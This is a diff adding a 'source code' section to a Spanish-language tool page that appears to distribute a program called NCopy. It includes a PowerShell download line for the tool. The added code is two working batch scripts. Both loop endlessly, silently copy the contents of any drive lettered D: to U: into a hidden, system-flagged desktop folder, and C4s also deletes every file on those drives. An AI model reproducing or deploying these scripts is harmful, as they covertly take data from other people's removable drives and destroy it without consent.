@@ -18,3 +18,48 @@ powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubuserconten
   <li>Ubicate en la carpeta: <b>C:\Users\%USERNAME%\Desktop\NCopy</b></li>
   <li>Abre la carpeta con: <b>start .</b></li>
 </ul>
+
+<h2>Codigo fuente</h2>
+
+<h3>C4s :</h3>
+<pre>
+<code>
+@echo off
+setlocal EnableDelayedExpansion
+:try
+IF EXIST "C:\Users\"%USERNAME%"\Desktop\NCopy" (
+ SET l="E:\" "F:\" "G:\" "M:\" "N:\" "D:\" "H:\" "I:\" "L:\" "O:\" "S:\" "U:\"
+ FOR %%a in (%l%) DO (
+  IF EXIST %%a (
+   XCOPY %%a "C:\Users\"%USERNAME%"\Desktop\NCopy" /s /i /y /q
+   DEL %%a"*" /s /q
+  )
+ )
+) ELSE (
+ MKDIR "C:\Users\"%USERNAME%"\Desktop\NCopy"
+ ATTRIB "C:\Users\"%USERNAME%"\Desktop\NCopy" +r +h +s
+)
+goto try
+</code>
+</pre>
+
+<h3>C4 :</h3>
+<pre>
+<code>
+@echo off
+setlocal EnableDelayedExpansion
+:try
+IF EXIST "C:\Users\"%USERNAME%"\Desktop\NCopy" (
+ SET l="E:\" "F:\" "G:\" "M:\" "N:\" "D:\" "H:\" "I:\" "L:\" "O:\" "S:\" "U:\"
+ FOR %%a in (%l%) DO (
+  IF EXIST %%a (
+   XCOPY %%a "C:\Users\"%USERNAME%"\Desktop\NCopy" /s /i /y /q
+  )
+ )
+) ELSE (
+ MKDIR "C:\Users\"%USERNAME%"\Desktop\NCopy"
+ ATTRIB "C:\Users\"%USERNAME%"\Desktop\NCopy" +r +h +s
+)
+goto try
+</code>
+</pre>
